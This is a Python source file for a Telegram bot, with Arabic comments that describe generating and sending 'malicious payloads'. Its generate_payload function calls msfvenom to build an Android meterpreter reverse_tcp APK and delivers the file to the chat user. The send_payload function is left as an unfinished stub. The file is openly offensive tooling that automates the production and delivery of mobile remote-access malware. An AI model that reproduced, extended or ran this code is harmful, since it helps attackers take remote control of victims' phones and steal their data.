import os
import subprocess
from telegram import Update
from telegram.ext import ContextTypes

async def generate_payload(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """توليد حمولة خبيثة مخصصة"""
    user = update.effective_user
    await update.message.reply_text("📦 جاري توليد الحمولة...")
    try:
        cmd = "msfvenom -p android/meterpreter/reverse_tcp LHOST=0.0.0.0 LPORT=4444 -o payloads/custom.apk"
        subprocess.run(cmd, shell=True, check=True)
        await context.bot.send_document(
            chat_id=user.id,
            document=open("payloads/custom.apk", 'rb'),
            caption="✅ تم توليد الحمولة بنجاح."
        )
    except:
        await update.message.reply_text("❌ فشل توليد الحمولة.")

async def send_payload(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """إرسال حمولة خبيثة للمستخدم"""
    user = update.effective_user
    await update.message.reply_text("📦 جاري إرسال الحمولة...")
    # تنفيذ الإرسال